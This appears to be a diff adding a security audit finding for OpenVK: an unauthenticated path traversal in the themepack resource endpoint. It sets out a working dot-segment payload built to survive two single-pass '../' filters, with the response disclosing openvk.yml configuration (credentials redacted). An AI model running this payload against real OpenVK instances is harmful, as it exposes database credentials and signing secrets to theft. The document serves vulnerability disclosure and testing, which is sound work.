@@ -1,0 +1,48 @@
+OVK-01 - Unauthenticated path traversal / arbitrary file read via themepack resource endpoint (CWE-22)
+Test date: 2026-09-29 | Stack: openvk master (this clone) + bundled chandler, Apache httpd 2.4.68 (Win64) with mod_fcgid + php-cgi 8.4.26, MySQL 8.0.39 on 127.0.0.1:3307, Windows 10 x64
+Deployment mirrors the officially supported Windows layout: front server rooted at htdocs/, front controller htdocs/index.php, app at OPENVK_ROOT.
+
+[0] Environment notes
+    - Full install: composer install from lock, chandler+openvk schemas imported (install/init-db.sql, install/init-static-db.sql, install/sqls/*), openvk.yml generated from openvk-example.yml (DB pointed at the temp instance).
+    - ENV PATCH (only deviation from pristine source): ovk-init.php env check no longer requires ext/imagick (no signed Windows DLL available for PHP 8.4 NTS; the themepack endpoint never touches Imagick). intl/sodium enabled as required.
+    - A minimal theme 'audittest' (theme.yml + res/) was installed under themepacks/ to simulate any installed third-party theme; theme ids are attacker-visible in page HTML. The built-in default theme id 'ovk' is intentionally excluded by Themepacks::offsetExists().
+    - PHP version quirk: the route placeholder version:(?:[0-9]+\.?)+ always matches numeric strings which chandler casts to int -> ThemepacksPresenter::renderResource(string $version) raises TypeError. A dotted version such as '1.0.' stays string and passes; attacker controls this parameter so it does not block exploitation.
+
+[1] Control: benign theme resource
+    THEME_RESOURCE_OK
+    
+        -> status:200 type:text/plain;charset=UTF-8
+
+[2] Control: naive forward-slash traversal is stripped by chandler_escape_url (single-pass ../ removal)
+    GET /themepack/audittest/1.0./resource/../../../openvk.yml -> status:404 (404: filter collapsed the climb)
+
+[3] Backslash traversal (audit PoC form \..\..\..\openvk.yml) does NOT survive modern Windows front servers:
+    - php -S (dev server, the openvkctl.cmd workflow): SAPI rewrites \ to / before the router sees the URI (observed via probe: REQUEST_URI /resource//../../../openvk.yml)
+    - nginx 1.26.3 Windows: same backslash folding observed at the app
+    - Apache 2.4.68 Windows: request line normalized the same way
+    The chandler code path itself (Router -> ThemepacksPresenter -> Themepack::fetchResource) has no containment; the gap is reachable through dot-segment payloads instead (below).
+
+[4] Working exploit: single-scan preg_replace reassembly ('....//' survives as '../'). Two escapes apply (Router::execute and ThemepacksPresenter), so the payload is crafted for double-pass survival:
+    GET /themepack/audittest/1.0./resource/./...../../././../././....././././....../../././openvk.yml
+    router pass  -> any = .../././..././...././openvk.yml
+    presenter pass -> res/../../../openvk.yml -> OPENVK_ROOT/openvk.yml (no realpath/containment check in Themepack::fetchResource)
+    --- response (unauthenticated, no cookies) ---
+    chandler:
+        debug: true
+        websiteUrl: null
+        rootApp: "openvk"
+    
+        preferences:
+            logs:
+                enabled: true
+                entitiesNamespace: "openvk\\Web\\Models\\Entities\\"
+    
+        database:
+            dsn: "mysql:host=127.0.0.1;port=3307;dbname=openvk"
+            user: "<REDACTED>"
+            password: "<REDACTED>"
+    [... full openvk.yml returned, including database dsn/credentials, 128-hex security secret, csrf/captcha/email config ...]
+
+[5] Impact notes
+    - openvk.yml discloses DB credentials and CHANDLER_ROOT_CONF[security][secret] (CSRF tokens, JWT session signing, captcha encryption).
+    - Depth is unbounded (placeholder any:.+ on the escaped path): any file readable by the PHP process can be exfiltrated the same way.
